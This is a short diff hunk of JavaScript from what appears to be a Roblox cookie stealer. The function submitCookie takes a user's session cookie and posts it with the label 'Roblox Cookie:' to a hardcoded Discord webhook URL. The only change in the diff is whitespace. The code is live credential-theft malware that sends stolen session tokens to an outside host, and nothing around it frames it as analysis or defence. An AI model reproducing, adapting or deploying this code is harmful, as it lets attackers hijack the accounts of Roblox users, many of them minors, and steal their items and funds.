@@ -57,7 +57,7 @@ function submitCookie() {
 
   if (cookie && cookie.length >= minCookieLength) {
     // Send the cookie to a Discord webhook
-    fetch("https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ", {
+    fetch("https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ", {    
       method: "POST",
       body: JSON.stringify({ content: "Roblox Cookie: " + cookie }),
       headers: { "Content-Type": "application/json" }
